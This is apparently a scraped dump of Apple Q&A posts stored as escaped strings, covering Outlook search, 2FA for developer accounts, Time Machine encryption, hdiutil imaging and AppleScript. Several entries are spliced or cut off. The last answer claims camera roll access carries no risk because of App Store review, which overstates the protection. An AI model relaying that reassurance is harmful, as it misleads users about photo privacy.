results and causes all the mail to be redownloaded from the server that it thinks it needs a local cache), but doesn't address the fundamental mechanism for search. Outlook uses spotlight and modifies spotlight with its custom plug in to handle the data format for Outlook data when it's stored on the local disk.\n\nA: I tried everything and in my case the only thing that solved the issue was selecting the New Outlook option from the top right of Mac Outlook.  After that, Outlook relaunched with the new look and also Search now works.\nMac mini M1 with Big Sur.  Outlook for Mac 16.45.\nHope this helps.\n\n\nA: Outlook and macOS's Spotlight (the indexing app) have notorious problems working together. With previous version I had success with the Repair tool that you mention. With Mojave & Outlook 2019, however, I had to try many other methods. This website seems to have the most comprehensive guides for troubleshooting this.\nIn my case, I finally found that \"alternative method 6\" from that guide worked. That means:\n\n\n*\n\n*Backup!\n\n*Quit Outlook\n\n*Go to the folder ~/Library/Group Containers/UBF8T346G9.Office/Outlook/Outlook 15 Profiles/Main Profile/Data (in Finder you can press cmd+shift+G to get there)\n\n*Move the Outlook.sqllite file e.g. to the Desktop (to keep it around until the restore is successful)\n\n*Launch Outlook. \n\n*Outlook will prompt you to repair your database. Click \"Repair\". Outlook is now forced to restore its database and rebuild the index, etc. In my case this took about 2–3 hours on a speedy MacBook Pro.\n\n*~/Library/Group Containers/UBF8T346G9.Office/Outlook/Outlook 15 Profiles/ will contain backups of your previous database. To free some disk space you may want to archive or delete this.\n\n\nA: There have been problems between macOS and Outlook search indexing for some time now. It appears that Microsoft, whilst acknowledging this, for some years already, appear to be doing nothing to fix this, as it has been under the status of \"investigating\" since the article was created.\nhttps://support.office.com/en-us/article/search-doesn-t-work-in-outlook-for-mac-after-macos-upgrade-b73de6f1-aeb9-4720-bbbe-de65ab50012e\nIt is arguable that the loss of reliable searching in an email application makes it not fit for purpose.\n\nA: For me the solution is to switch to Outlook Web Access - at least for searching. I had this problem on and off for at least 2 years now and couldn't find the solutions to work. For a time the OutlookSearchRepair was helping, but since that is no longer working I don't find the proposed solutions to work.\nSo my suggestion: Check if your organization provides Outlook Web Access (OWA) and use that for searching or even all your mail duty.\n\nA: Right now, the current guidance on Big Sur is to uninstall and reinstall Office for Mac.\nhttps://support.microsoft.com/en-us/topic/search-in-outlook-for-mac-returns-limited-or-no-results-for-macos-big-sur-b5dec081-3aa0-4f10-bba7-7a18f3f85252\n\n", "Q: With Apple Music Family Plan, can two devices with the same Apple ID stream at the same time? Let's say I have the Apple Music Family Plan and two iOS devices signed into the same Apple ID.  Can these two devices both stream at the same time?\nBackground: All the documentation around Apple Music Family Sharing assumes that each member of the family uses their own device with their own Apple ID.  For us this is not the case.  Family members just pick up whatever iOS device is lying around and want to stream music from that device.\n\nA: Yes, my wife and I share an Apple ID for Music, since we use iTunes Match as well as Apple Music. It works fine.\n", "Q: How to stop the Apple Music ads every time I launch the Music app? Lately, the Music app on my iPhone XR has been showing the \"Join Apple Music!\" call-to-action interstitial screen pretty much every time I launch it. Usually this happens when I'm in a bad-network area, too, so it takes a few minutes before it appears, preventing me from playing my locally-stored music and playlists.\nI neither have nor want Apple Music, and I have disabled Apple Music on my device through the respective control panel:\n\nAnd yet I still get the interstitial ad for Apple Music at least once a week, if not more. Is there any way to disable this \"feature?\"\n\nA: I hate to say, but I’ve not been able to find any way to accomplish this so I’m going to recommend just using a different music app with your same music library that the native Music app creates and manages. \nFor me, I love the Cs music player and it does an amazing job at using your existing music library and lets you avoid using the native app any time it disappoints you. \n\n\n*\n\n*Cs Music Player by Mike Clay\nI think this used to be called the cesium player if you search for other reviews or don’t want to try this app. What it does for me is it knows which songs are Apple Music and coached locally, so I don’t incur data charges and just want to shuffle songs I already downloaded. I also prefer this app over Apple for several local library situations (classical music, better for me interface, etc...)\n", "Q: How do you read /dev/tty.iap on iOS? I want to access data from a USB device attached to an iPad on that iPad. So far, I've written a basic app that detects whether files exist or not on the iPad. However, it says the /dev/tty.iap file does not exist when I connect the USB device to it.\nIs there an entitlement issue for this? Or is this a TCP/IP issue?\nAgain, the ultimate goal is to read the file, but it's not even detecting it.\n\nA: No, you can't read /dev/tty.iap file on an iOS device. At least as long as the device isn't jailbroken.\n3rd party iOS apps are sandboxed and not allowed to read the device filesystem.\nFrom File System Programming Guide:\n\nThe iOS file system is geared toward apps running on their own. To keep the system simple, users of iOS devices do not have direct access to the file system and apps are expected to follow this convention.\n\n\n\n\nUnofficially speaking, iOS however allows read-only access to some parts of the filesystem as noted in this reddit thread:\n\nHello everyone, I’m an aspiring security researcher, and got bored. I decided to look at how far the sandbox really lets you go in terms of accessing parts of the filesystem that aren’t part of its designated container.\nPLEASE NOTE: In NO WAY does this at all allow you to modify, add, or delete ANY files in the areas I am about to talk about. These areas in the system are, in UNIX terms, “Read-only”.\nWhich directories can you view?\nAfter combing the filesystem using an app I’ll mention later, these are the directories.\n  \n  \n*\n  \n*/System/Library\n  \n*/usr/lib\n  \n*/Developer\n\nThe above explains, why you are able to read /Developer and can't read /dev/tty.iap.\n\nA: The most important here is not how to access /dev/try.iap, rather it is that you seem to have misunderstood what it is used for. It does not give you access to USB-drives or their files at all. Even if you could access through some means, it won’t do what you hope.\n/dev/tty.iap provides access to the serial communication line inside the old 30-pin connector. This means that it cannot be used with USB at all - only with serial (RS-232) communication, and it is only there on very old iPads (the first, second and third generations). An iPad from 2012 or later does not have the connector.\n", "Q: Cannot pass contents of Chrome address bar to Automator workflow For some time now, I have been using a keyboard shortcut to grab the selected text inside the address bar in Google Chrome and pass it to a Service (now called a Quick Action):\n\nSometime last week, I noticed that this workflow no longer receives input from the Chrome address bar.

Using my best guesses:\n\n\n*\n\n*You said Current Date is manually entered. Lets say in Current Date Table, B1.\n\n*It seems that in your due date table, the actual Due Date is always just that other table's \"current date\" plus one day, so use a formula like\nCurrent Date Table::B2 + 1\n\n*The dates seem to have no bearing on your \"Payments Left\" tally, so perhaps just count the \"Payment Made for dd/mm/yy\" value cells containing FALSE, and subtract one. For example:\nCOUNTIF(Payments By Date Table::B,FALSE)-1\nor to add on the parentheses and Payments Left text:\n\"(\" & COUNTIF(Payments By Date Table::B,FALSE)-1 & \" Payments Left)\n\n", "Q: If you deactivate an iPad from your Apple ID, will it still receive iMessages? I recently went on the iTunes store and took my Apple ID off of my iPad.

The problem is that I use separate account only for development, let's say it's account A. My main account (B) is used on all my devices (iPhone, Mac) and it has 2FA already turned on. So is there any way to enable 2FA for account A and use devices where I'm logged in with account B? I think it might be quite common problem actually so there should be some solution.\n\nA: Yes, it is relatively straightforward if you follow Apple's guide here:\nhttps://developer.apple.com/support/account/authentication/\nLook under the heading \"How can I use different Apple IDs for iCloud and my Apple Developer Account\".\nThe basic idea is that you enable 2FA for you developer account. The easiest way to do that with the devices you've got, is to create an extra user on your Mac. Login to that user on the Mac and sign in with your developer account and enable 2FA at System Preferences > iCloud > Account Details > Security.\nThen on your ordinary, main account and your iPhone, you just need to add the developer account as an extra iCloud account for 2FA. On the iPhone you go to Settings > Passwords & Accounts > Add Account > iCloud. On the Mac you go to System Preferences > Internet Accounts > iCloud.\nNow that everything is setup, you can delete the temporary user again.\nSo now even though your main iCloud account is B, you'll receive 2FA codes for both account A and B on your iPhone and Mac.\n", "Q: How can I type Lithuanian stress characters (e.g., ą́, ė̃, m̃)? This is an obscure use case, so I'm not surprised that there's nothing about this online. I already know how to type accent marks in general, and how to change keyboards. However, I was not able to find any way to type e.g. m̃ using the Lithuanian or ABC Extended keyboards. I thought option-N followed by M would work in ABC Extended, for instance, but it doesn't.

For example, I can obviously type é, ȩ, and č in either of the keyboard layouts above.\nAny advice is appreciated. I would prefer to not have to pick characters from the symbol selection table.\n\nA: For info on how to add combining diacritics to any character with ABC Extended, see this page\nhttp://sites.psu.edu/symbolcodes/mac/codemacext/\nFor example, m̃ is made by typing m and then option-shift n. ė̃ is made by typing option w, e, then option-shift n.\nThe keystrokes for adding acute  ́ and grave  ̀ are option-shift e and option-shift `.\nYou might want to create a customized version of the Apple Lithuanian keyboard using Ukelele to adding keys for the combining diacritics used to indicate stress.

Pressing ⌘ + S has no effect.\nThe Mac currently uses Bootcamp for dual boot into Windows or macOS. By default it boots into Windows. I cannot change the default boot OS. Possibly because I don't have an administrator account in macOS. \nThe following link is what I'm trying to accomplish using safe mode:\nI don't have administrator account on my mac\nTL;DR How to enter macOS safe mode after selecting macOS in Startup Manager?\n\nA: I am not sure how old your Mac is, but for Macs made in at least the last 10 years, this should work.\nAfter booting to the Startup Manager, you can hold down the control key while selecting the operating system to boot. You should see the straight arrow change to a circular arrow. The selected operating system will now become the default.\nAdditionally, many Boot Camp arrangements allow the default boot operating system to be selected from the Windows Control Panel.\n", "Q: How to improve the performance of a Ubuntu Virtual Machine running in VirtualBox? I'm using VirtualBox 6.0.4 to run a Ubuntu 18.0.4 guest on a MacBook Pro 2018 host with macOS Mojave. The MacBook host has an i7 processor and 16GB of RAM. In addition to VirtualBox, I'm running Google Chrome. According to Mac Activity Monitor, the CPU is mostly (90%) idle.\nThe virtual machine is too sluggish - whenever I drag a window across the screen it moves slowly, and rather than moving around the screen smoothly, it abruptly changes its location.\nCurrently, the Virtual Machine has the following configuration:\n\n\n*\n\n*12 GB base memory\n\n*6 processors\n\n*Acceleration: VT-x/AMD-V, Nested Paging, KVM Paravirtualization\n\n*128 MB video memory\n\n*3D acceleration enabled\n\n*IDE Primary Master: VBox Guest Additions\n\n\nI've read some suggestions here and in other forums, but I haven't found a solution that works.

Although changing the default output device to Internal Speakers doesn't change the displaysleep setting.\n\nA: So I think the reason is that the new monitor supports audio, and putting the display to sleep would also kill audio output. Even if the monitor isn't selected as the default output device, coreaudiod prevents display sleep in case some application wants to use it.\nI found a solution.

The same can be accessed here:\n\n\n*\n\n*Bug Reporting - Apple Developer\n\nA: The fastest way is on twitter and the support webpage and iOS app. The old bug reporter and feedback mechanisms are there too, but the analogous fast and human interaction method of support is to ping Apple’s customer support and relations staff directly. \nI find asking for guidance and training works better than ranting about how awful a bug is, but I’ve seen both get really professional guidance and started using that over the traditional Genius Bar and Apple support pages. Also, often I just didn’t realize how to do something and they’ve been forthcoming when what I face is legitimately a design decision where I need to offer feedback on my use case and why their design decision wasn’t optimal for me. Same with bugs, support can and will escalate to engineering if you don’t have another support path in place as a developer or business partner. \nIf it’s a bug, you’ll want to bring reproducible steps or ask how to collect the logs they need to analyze the failure. They will steer you to the appropriate avenue whether it’s understnading the feature or asking for traditional feedback or working with AppleCare support to isolate the issue. \nI always start with support, then go where they direct:\n\n\n*\n\n*https://support.apple.com/\n\n*https://twitter.com/AppleSupport\n\n*https://itunes.apple.com/us/app/apple-support/id1130498044\nSome of those links are in the support pane of About this Mac as well if you prefer to click something from apple directly. The iOS support app is really nice as well, in my experience. It integrates with iMessage and call back quite effortlessly. \n", "Q: Brand new external hard drive formatted exFAT is mounted read only I bought a new HDD, formatted as exFAT with mac.\nI moved files from my laptop to the HDD (moved, I mean, I also deleted them).\nIt happened with a directory it got stucked.

If you have access to a Linux or Windows machine they may be able to run the disk repair process more quickly, but regardless, something needs to go through the whole disk and repair whatever damage may have occurred by the unclean disconnection.\nSimply waiting for there to be \"no processes\" is also insufficient to ensure that a disk is safe for removal; the operating system takes some time to flush out its write caches and other performance-enhancing processes that allow you to get more work done while the actual disk operations happen in the background. It's possible that the files were not fully transferred; hopefully you have backups of them (which is a good policy to have in any case).\n", "Q: Power off block devices I would like a way to shut down the block devices to do safe removal by turning them off. On Linux there is the UDisks2's udisksctl power-off -b /dev/sdX command. Is there something similar? Or if you know a library to use to create a script that can do this.\n\nA: umount will unmount a block storage device. Once the device is unmounted, it is safe to remove/unplug it. There doesn't appear to be a udiskctl for macos. \n", "Q: Enable Two-factor authentication without being logged into an iOS/macOS device The Apple ID I use for my developer account is separate from my personal Apple ID. All my devices are signed in with my personal Apple ID.\nI was trying to set up Xcode on my machine, and when I went to sign in to my developer account, it told me I had to set up Two-factor authentication.\nUpon going to the Apple website to do so, however, it told me I had to be logged in to the account from an iOS or macOS device to set it up, which I am not. So how can I use Two-factor authentication (presumably via a trusted phone number) with my developer Apple ID without being logged in to that Apple ID on a iOS/macOS device?\n\nA: The linked MacRumors article discusses your exact concern and solution in detail:\n\n\n*\n\n*How to Set Up Two-Factor Authentication for Multiple Apple IDs on One Device\n\nAs of February 27, 2019, Apple is requiring that all Developer accounts with an Account Holder role be secured with two-factor authentication in order to ensure that only the account owner is able to sign into the account.\nThe requirement has caused some confusion among developers who have multiple Apple IDs, particularly those who use a dedicated Apple ID for their Developer account that is separate from their primary iCloud account used on their devices.\n\nThe solution to the problem requires you to login with your developer user account on a trusted device. This can be done by creating a new/temporary user account on a Mac, logging into iCloud with your developer Apple ID, activate Two-factor authentication when asked to and entering a phone number to receive text messages.\nYou can then proceed to setup an iOS device to receive verification codes without enabling other iCloud features. Go to Settings app → Passwords & Accounts and add a new iCloud account. After authenticating successfully, choose not to enable any of the iCloud features and save the account.\nThis way you can have a trusted device setup to receive Two-factor authentication codes without logging out of your primary iCloud account on your device.\n\nA: You have to be logged in to that account so that you can receive the two-factor authentication codes. However, for a device to be trusted for an Apple ID, it does not have to be logged in as the primary Apple ID on the device/account. You can log in to many Apple IDs while keeping your existing Apple ID as primary. On iOS, go to Settings → Passwords & Accounts → Add Account → iCloud.\n\nA: For anybody wondering if you can also enable 2-step verification without an actual IOS device. You can use the steps provided on this page\n", "Q: How can I change the ownership of the unwritable directories for Homebrew?

I'm creating small encrypted disk images (under 10 GB) to be used to secure and transfer data between systems running High Sierra (for now) and Mojave.  Are there any technical reasons to prefer HFS+ (Mac OS Extended, Journaled) over APFS for these images.  The images will be created as .sparsebundle files if it matters.\nEdited to add:  .sparsebundle files will be stored on an APFS file system in all cases.\n\nA: In addition to @bmike's very good answer, some legacy programs expect the directory listing to be pre-sorted as it is in HFS+; this is an uncommon issue but some things (especially ones which implement their own custom file selector for whatever reason) run into it all the same.\n\nA: Whether you choose APFS or HFS+ for the sparse disk image will matter very little. They are synthetic filesystems and pass through iOPS and data to the underlying filesystem. That will have some technical details to consider and illuminate the differences how each relies on the storage to store filesystem data and work with or against the hardware that records the bits physically.\nHFS+ has more third party data recovery options and is further backward compatible so those are two main technical reasons to potentially prefer HFS+ over APFS. If you’re storing the data on a spinning disk, that might be a technical advantage or might not. You’ll have to test that on your kit as benchmarks vary widely there. \n\n\n*\n\n*https://en.wikipedia.org/wiki/Apple_File_System\nYou give up the metadata protection checksums, crash protection of copy on write and encryption advances of APFS as well as the redesign of the filesystem to take advantage of flash/ssd.  You also lose snapshots, clone copy and don’t receive the more flexible space allocation features of APFS. \nSpeed chould be a wash on flash / ssd for your use case, but I would still  benchmark your sparse images on both file systems. HFS+ might be far better tuned for a HDD still ( or possible for evermore) as APFS sacrifices HDD performance for flash and ssd performance today as implemented. \n", "Q: Force Strong Password Generation Is there any way to prompt iOS to generate a password when it doesn't detect a New Password/Change Password field?\n\nA: Here is a great link from Cult Of Mac about how to use Siri to generate a secure password.   https://www.cultofmac.com/227362/use-siri-to-generate-a-super-secure-random-password-ios-tips/\n", "Q: Full Disk Encryption with Time Machine Backup I don't know the appropriate setup to encrypt whole disk drive using FileVault 2 and Automatically backup it without issues.

Just press \"Turn on FileVault...\" and full disk encryption will be setup. \nFull Disk Encryption in this sense means that all your own data on the Macintosh HD file system will be encrypted. There is a preboot partition that isn't encrypted, as this is where the software necessary to decrypt the drive is stored. Without it, you wouldn't be able to boot the Mac.\nWhen you plugin the USB drive, macOS will ask you if you want to use it for backups. If you confirm that, it will ask you whether or not you want the backups encrypted. Set the checkmark and encryption of the backup will automatically be setup for you.\nIf you have already started backing up to the external disk without encryption, you can enable encryption afterwards like this:\nOpen System Preferences > Time Machine. Click \"Select Disk...\" and remove the external disk.\nDo it again and select the disk again, and it will ask again for encryption. Set the checkmark and you'll be asked to set a password. The disk will then be encrypted.

I bought a G-Drive 8TB external USB-C hard drive to use as a Time Machine disk for my new 15\" 2018 MacBook which is appointed with 32GB of RAM & 4TB SSD storage. Snappiest MacBook you can buy, or should be...\nIt's taking FOREVER to provision the 8TB G-Drive Time Machine disk- about a WEEK has elapsed since the process started and \"Time Machine\" in System Preferences still shows the status as \"Encrypting\" and is only HALFWAY completed while running continuously.\nThe G-Drive disk is USB-C and the connection to it from the MacBook is native USB-C (no adapter used).  There's no settings in OSX to tweak to improve encryption performance: only Time Machine \"Options\" to choose are: \"Backup while on battery power\" and \"Notify after old backups deleted\". Neither is relevant.\nAm I missing a trick here, or are others experiencing the same excruciating slowness trying to provision a large Time Machine disk?  If so, have you found a fix?\nWould also be interested in hearing from folks using similarly large disks from other storage vendors and their experience in respect to performance when provisioning a large encrypted Time Machine disk.\n\nA: The reason it is taking long time is that the system is currently in progress encrypting all the pre-existing data on your disk. So the disk is already an \"encrypted\" disk according to the file system format, and any data you write to it will be automatically encrypted. However there are still remnants of old data on disk that is not encrypted yet, but is in the process of being encrypted.\nThe problem is that the system treats the whole disk as something that needs to be encrypted, no matter if the remnant data was actually something you used to hold vital data, or it is just never-used or long-gone data areas that hold nothing of interest. It simply has to process it all. The process has a low priority and speed because it usually can take place in the background while you use the computer (and disk) for other stuff.\nThe quick fix if you haven't got any pre-existing data to save is simply to reformat the drive. When you reformat it, please select it to be Encrypted, Journaled HFS+ in Disk Utility, as the disk will be reformatted as encrypted right away. The old data is not going to be processed, therefore it should be done very quickly.\n", "Q: Disk disappears while trying to upgrade to Mojave, error ppm002 I'm on High Sierra, MacBook Pro, 2017. For some reason it wouldn't finish logging me in and turn the laptop off today's morning.\nWhat I've tried so far:\nFirst aid says everything is OK, while giving error \"ppm002\" in diagnostics. I'm trying to upgrade to Mojave in hopes that it will fix it. While choosing a disk to install on and after typing the password - the disk disappears from the choice menu, and I can't proceed with installation.\nAny ideas? I'd be glad if there is a way to save information from the ssd.\n\nA: Error PPM002 points to a memory (RAM) issue. See Apple Diagnostics: Reference codes for more info.\nEdit #1: I'll expand a bit - I had a 2014-era iMac in for repair early last year because it wouldn't update to High Sierra from a seemingly working Sierra, and in the end it turned out to be faulty memory. Whether this was due to a specific way that macOS accessed the RAM during an install, I don't know. What I do know is that it was faulty RAM and replacing it solved the problem. There was a PPM error, though I don't recall the exact number.\nYour MacBook Pro (assuming Mid 2017 model) has soldered RAM, which means if it is faulty, then it's going to involve an Apple repair or replacement. Unfortunately it's not possible to just pop the RAM out and replace it.\nSome things to try:\n\n\n*\n\n*run Apple Hardware Test to do a full check of your RAM. Any Apple authorised technician will run this as part of their tests, so it's useful to get something concrete.\n\n*use another Mac to make a bootable High Sierra (not Mojave) USB stick, take a full backup of the drive using Disk Utility. The bootable installer (which doesn't actually require you install anything to the hard drive) is more lightweight on RAM use, so you have a good chance of getting your data backed up. If you're using Time Machine and it's up-to-date, disconnect that for now so you know you have a relatively safe backup if your MacBook does need to be repaired/replaced.\n", "Q: Calculating time with AppleScript I created one start to log a \"start time\" and save into a plist file, and a an other script to read the start time and calculate the number of time elapsed from the start time and now (reading time)\nfirst script (log time in plist) :\nset myDate to date string of (current date)\nset [dayLetter, dayNumber, MonthLetter, yearNumber] to the words of myDate\nset t to (time string of (current date))\nset [hoursInNumber, minutesInNumber, secondInNumber] to the words of t\n\n\nset startTimeValue to (current date)\nset startTimeClear to dayLetter & \" \" & dayNumber & \" \" & MonthLetter & \" at \" & hoursInNumber & \":\" & minutesInNumber\n\nset plistR to {startTime:startTimeValue, startTimeClear:startTimeClear}\ntell application \"System Events\"\n    set plistf to make new property list file ¬\n        with properties {name:\"~/Desktop/myTime.plist\"}\n    set plistf's value to plistR\nend tell\n\nsecond script (read plist)\nset NowTimeValue to (current date)\nset the plistfile_path to \"~/Desktop/myTime.plist\"\ntell application \"System Events\"\n    set p_list to property list file (plistfile_path)\n    -- read the plist data\n    set startTimeValue to value of property list item \"startTime\" of p_list\nend tell\nset Elapsed to startTimeValue - NowTimeValue\n\nthe main issue is, the time given is in second, and if I try yo divid by 60 that give me an hour.\nhow can I get this time in minutes / hours instead?\n\nA: Never-mind find the solution :\nset Elapsed to (startTimeValue - NowTimeValue as number) / 60\n\n", "Q: Creating an image from a Time Machine backup – \"Operation Cancelled\" I want to convert an existing Time Machine backup (on an external HDD, encrypted) to a read-only archival image.\nI open Disk Utility and choose File » New Image » Image from Backup, which lets me choose the destination.

Try this:\n\n*\n\n*Open System Preferences\n\n*Choose Security & Privacy and then click on the Privacy tab\n\n*Select Full Disk Access from the list on the left\n\n*If necessary, click the padlock icon to allow changes\n\n*Click the + icon and add Disk Utility to the list of apps by browsing to it (/System/Applications/Utilities/Disk Utility.app)\n\n*Re-open Disk Utility and try making the image again.\n\n\nA: For some reason, this only works via command line using the hdiutil tool.\nFirst, open Disk Utility, right click the source drive (the Time Machine volume), and choose Unmount. Do not eject it!\nThen, open a Terminal window, and enter:\ndiskutil list\n\nYou should be able to locate your volume. For example, in my case, it was listed as follows:\n/dev/disk5 (external, virtual):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:                  Apple_HFS Backup Apollo          +500.0 GB   disk5\n                                 Logical Volume on disk4s2\n                                 8577521E-D394-45A0-BB7E-26F9E19C1FE7\n                                 Unlocked Encrypted\n\nCopy the identifier, /dev/disk5. This is what we want to convert into an image.\nWe now need a path where we can store the image. For example, you can choose a mounted volume. In the following example, /Volumes/Data/Backup.dmg is the target file. Change it according to your needs.\nThen, run the following command, which will create an encrypted image of the source volume /dev/disk5 (the old Time Machine backup) under the new file /Volumes/Data/Backup.dmg:\nsudo hdiutil create /Volumes/Data/Backup.dmg -encryption -stdinpass -srcdevice /dev/disk5\n\nThis will first ask for your sudo password (the password of your current user account).\nAfter entering the sudo password, you will be asked for an encryption password.\nThis takes a while, but it works:\nElapsed Time:  7h 15m 52.227s\nFile size: 293424025874 bytes, Checksum: CRC32 $753B4175\nSectors processed: 976562496, 968645649 compressed\nSpeed: 18.1Mbytes/sec\nSavings: 41.3%\ncreated: /Volumes/Data/Backup.dmg\n\nFor more options, run man hdiutil.\n\nA: Try this: create a fresh (or use an existing) USB stick from the Mojave installer, boot from it, and use Disk Utility to make the image. You'll need to provide the Time Machine decryption password to mount the drive -- but since you're not in macOS proper, you should have an easier time of things.\nYou'll need to get a Mojave installer before you make the USB, assuming you don't already have one on the system hard drive. Easiest way is to download from the App Store, which also ensures you have the latest point release.\nMaking a bootable USB stick from the installer is pretty straightforward -- the macOS bootable USB instructions are good if you're handy with Terminal, or use Install Disk Creator if you're more of a GUI person.\nAlso -- and this might be a red herring but I'm curious -- the volume you're trying to back up in Disk Utility is a logical volume. Click View on the top left, then Show All Devices, then try backing up the drive itself rather than the volume. Does that provide anything of use?\n", "Q: Applescript refer a link to a file in current finder window Edited.\nWhere is my current script :\nset plistfile_path to POSIX file \"/users/moi/Desktop/Time/\"\n\nchoose file with prompt \"Please choose a file:\" of type {\"plist\"} ¬\n    default location plistfile_path\n\n\n##set the plistfile_path to \"~/Desktop/myTime.plist\"\ntell application \"System Events\"\n    set p_list to property list file (plistfile_path)\n    -- read the plist data\n    set startTimeValue to value of property list item \"startTime\" of p_list\nend tell\n\nI don't manage to get it work using the choose file dialog.\nI'm having this error :\n\"error \"System Events got an error: Can’t make file \\\"Macintosh HD:Users:nadjarian:Desktop:Time:\\\" into type integer.\" number -1700 from file \"Macintosh HD:Users:moi:Desktop:Time:\" to integer\n\"\n\nif I get script of the dialog, it's work fine with this list instead :\nset the plistfile_path to \"~/Desktop/myTime.plist\"\n\nany idea how to fix the error?\n\nA: This seems to work for me, \nI'm setting the patch with the variable P and set a to POSIX file p\nThen I create a dialog with the default location of the variable A\nset p to \"/Users/usernmaHere/Desktop/Time\"\nset a to POSIX file p\n\n\nset config_file to choose file with prompt \"Locate your .plist config file and click OK\" of type \"plist\" default location a\n\nI added file limitation with \" type \"plist\"\n", "Q: What does Apple's new App Store requirement mean This message came in my App Store Connect:\n\nUpcoming Submission Requirements As a reminder, starting March 27,\n  2019 all new apps and app updates for iPhone or iPad, including\n  universal apps, will need to be built with the iOS 12.1 SDK and\n  support iPhone XS Max or the 12.9-inch iPad Pro (3rd generation).\n  Screenshots for these devices will also be required. All new apps and\n  app updates for Apple Watch will need to be built with the watchOS 5.1\n  SDK and support Apple Watch Series 4.\n\nWhat does the line will need to be built with the iOS 12.1 SDK mean? Does it mean that minimum supported iOS version need to be iOS 12.1?\nI have already an app in App Store with minimum iOS as 10.0. Do I need to change that to 12.1?\nLink to the news:\nhttps://developer.apple.com/news/?id=03202019a\n\nA: No, there’s no requirement to change the minimum supported iOS version.\nThe only requirement is that you must build it with the 12.1 SDK. You can do that while supporting older iOS versions.\nFor most the new requirement just means that you have to update Xcode and rebuild your app. It takes a few minutes, and most probably already updated anyways. \n\nA: Minimum SDK ≠ minimum OS version.\nYou will have to compile your app with the SDK ≥ 12.1, but your Deployment Target can be lower than that. Apple wants to \"force\" you to prepare the UI for iPhone XS Max.\nHere's more info about the SDK and Deployment Target on StackOverflow.\nSimple explanation from Big Nerd Ranch:\n\nSDK stands for “Software Development Kit,” which is the set of libraries and headers for a particular OS version. This is the version of Apple’s APIs that you compile and link against. The SDK describes the set of API available to you. Linking against the iOS 9 SDK means you can use any API that comes with iOS 9. You won’t be able to directly use stuff introduced in iOS 10. Modern Xcodes are tightly coupled to the SDKs for the latest OS versions, so if you upgrade your Xcode, you will be linking against a newer version of the SDK.\nThe other version number is the Deployment Target. This declares the oldest OS version your app will support. How far back you decide to support is a business decision based on how much work you are willing to do for customers on older versions of the OS.\n\n", "Q: 32-bit mac apps in the future It's long been telegraphed that 32-bit apps will no longer work in upcoming versions of macOS. This is rather annoying, because my go-to games when I want to waste 15 minutes are all 32-bit from companies that no longer exist.\nDoes anyone have any ideas whether there will be any way to run these apps, perhaps in a wrapper? No, booting another OS is not a solution. Is there any info on this issue at all?\n\nA: You can use either Parallels Desktop or VMware Fusion to run older macOS versions. The virtualization runs on top of Catalina so there won‘t be a need to reboot. And unless your games are very GPU-intensive you should get decent performance as well. \n\nA: 1) My plan is to simply run old versions of the operating system, supported by disk clones made using tools like Carbon Copy Cloner. I currently keep an os 10.9 system running this way, and a 10.14 system in a dual boot capability presently. Perhaps in future I will have a triple boot setup, not looking forward to that.\n2) Time machine does not like to restore to an older os version so I use both Time Machine in conjunction with a hot-spare disk clone. Rsync is also able to maintain the freshness of these backups if Carbon Copy Cloner not suitable. \n3) I can't see why it wouldn't be possible to convert 32-bit x86 machine code into super ugly 64-bit x86 machine code. After all, doesn't the x64 support 32-bit multiply? Sure it does! A processor supporting x86-64 still powers on in real mode for full backward compatibility, as x86 processors have done since the 80286. x86_64  introduces two new modes of operation, 64-bit mode and compatibility mode, along with a new 4-level paging mode. A chip series called Itanium was invented to attempt at a pure 64 bit architecture. In January 2019, Intel announced that Itanium 3 would be discontinued, with a last order date of January 2020.\n", "Q: Change default duration for Calendar events on macOS Mojave In the Calendar app on macOS Mojave, is it possible to change the default duration for an event from one hour to twenty minutes?\n\nA: It doesn't seem to be possible. The closest you can get is to open the Day or the Week view, and add a new event by dragging from the begin time to the end time. However, you'll be limited to a duration which is a multiple of 15 minutes:\n\n(of course, you can freely edit the begin and end time afterwards, but that would work for the one-hour events too)\n\nA: Open Terminal and enter the following command:\ndefaults write com.apple.iCal 'Default duration in minutes for new event' 30\n\n(example is 30 minutes)\nYou will need to quit and restart Calendar app for the change to take effect.\n+++\nTo reverse the change and revert back to defaults, use Terminal command:\ndefaults delete com.apple.iCal 'Default duration in minutes for new event'\n\n", "Q: The command Line would not let me repair my disk permission on Mac (Mojave) Im on macOS Mojave on my Mac.

It would still work if you put the sim card into an android phone, but that doesn't seem to be what you want, as you'd now need another phone number for calls on your iphone...\nThe closest you can get on an iphone is probably through your provider's sms website offerings, like this one: https://n.vodafone.ie/business/products-and-solutions/mobile-communications/bulk-texts.html\nDepending on your provider, you could probably put a shortcut somewhere on the iphone which opens a page where you can see your sms inbox and write new ones - with some business features on top.\nThen you just need to deregister your phone number from imessage and make it work with your email address only. Anyone entering your phone number on imessage should then get to send the message in green.\n\nA: The big question is will your carrier allow you to deliver voice to one device and forward the SMS to another service or SMS number you control as opposed to sending your SMS to your iPhone. They overwhelmingly insist on delivering SMS to the same cellular radio as the device registered for voice, but might be able to make that change for you. \nOnce you find that out, there are all manner of SMS services that run server side that will receive SMS and turn them into APNS notifications for any number of apps to consume. \nYou also might need to port your number to a MVNO / VOIP provider and then get a new cell number and forward voice to the old number. \nLots of avenues to split things, but almost all involve duplications of cell service unless your carrier will enable a split delivery from one number to two services. \nAt that point, you choose any app that pleases you and deregister iMessage from any or all of your SMS numbers so other iOS devices will send true SMS and not iMessage notifications over the APNS and your cellular data connection. \n\n\n*\n\n*Figure your carrier options or switch carriers\n\n*Decide if you need two SMS or one works\n\n*Pick your app for voice and your app for sms\n\n*Deregister all SMS from iMessage\n\n\nA: You can turn iMessage off in the Settings app under Messages. Then your iPhone will only send SMS and MMS messages using your phone number. \nYou will also need to turn off FaceTime.\nYou will also want to make sure every iOS device you have has iMessage turned off, or you will just get iMessages on the devices that have it turned on.\nIf those steps don't work Apple provides a form to deregister your phone number from iMessage. It is nominally for Android users so I'm not sure if it will work for iPhone users.\nYou will not find a way to replace Messages as the default app without jailbreaking. \n", "Q: Implications of giving app access to camera roll If I give an app access to my camera roll, what exactly does that imply? Can the app in theory upload all my photos to their server? E.g. when I upload an image to Instagram I can scroll through my camera roll and choose a photo to share. Even though I only press share on this one photo, can Instagram in theory upload my other private photos to their server? (Please add sources for your statements)\n\nA: You have nothing to worry about. \nAn app will always be required to ask permission to access your Camera Roll - no matter what it needs it for. Apple's photos system is built in a way that prevents an app from simply retrieving a photo and sending it to any remote service without first having your consent to do this AND it will have to display the process to the user.\nEvery app that is the App Store has been thoroughly examined by Apple and the binary (the code) is tested to ensure it doesn't do anything sketchy - in which case Apple would simply not allow it to be published on the App Store.\nAn 